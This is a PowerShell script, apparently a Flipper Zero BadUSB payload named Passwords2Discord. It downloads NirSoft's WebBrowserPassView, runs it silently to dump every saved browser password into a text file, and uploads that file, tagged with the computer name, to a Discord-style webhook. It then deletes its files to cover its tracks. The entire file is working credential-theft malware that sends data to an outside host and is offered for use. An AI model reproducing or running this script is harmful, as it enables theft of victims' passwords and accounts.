$ProgressPreference = "SilentlyContinue";

New-Item -Path $env:temp -ItemType Directory -Force;
Set-Location $env:temp;

$headers = @{
    "Authorization" = "Basic ZG93bmxvYWQ6bmlyc29mdDEyMyE=";
    "Referer" = "https://www.nirsoft.net/password_recovery_tools.html"
};

Invoke-WebRequest -Headers $headers -Uri https://github.com/Agente404/flipper/raw/main/payloads/Passwords2Discord/wbpv.zip -OutFile wbpv.zip | Wait-Process;

Expand-Archive "wbpv.zip" -DestinationPath "wbpv" | Wait-Process;
Remove-Item "wbpv.zip" -Force;

Start-Process -FilePath "wbpv\WebBrowserPassView.exe" -Args "/stext wbpv\pwd.txt" -Wait;

$fileBytes = [System.IO.File]::ReadAllBytes("$env:temp\wbpv\pwd.txt");
$fileContent =  [System.Text.Encoding]::GetEncoding("UTF-8").GetString($fileBytes);
$boundary = [System.Guid]::NewGuid().ToString();
$LF = "`r`n";
$time = Get-Date -Format "ddMMyyyyHHmm";

$data = @{
    "username" = $env:COMPUTERNAME;
    "content" = "$env:COMPUTERNAME2 passwords";
    "attachments" = @(
        @{
            "id" = 0;
            "description" = "Passwords $env:COMPUTERNAME $time";
            "filename" = "pwd-$env:COMPUTERNAME-$time.txt";
        }
    )
} | ConvertTo-JSON;

$body = (
    "--$boundary",
    "Content-Disposition: form-data; name=`"payload_json`"",
    "Content-Type: application/json $LF",
    $data,
    "--$boundary",
    "Content-Disposition: form-data; name=`"files[0]`"; filename=`"pwd-$env:COMPUTERNAME-$time.txt`"",
    "Content-Type: text/plain$LF",
    $fileContent,
    "--$boundary--$LF"
) -join $LF;

Invoke-WebRequest -Uri $Hook -ContentType "multipart/form-data; boundary=$boundary" -Method Post -Body $body;

Remove-Item "wbpv" -Force -Recurse;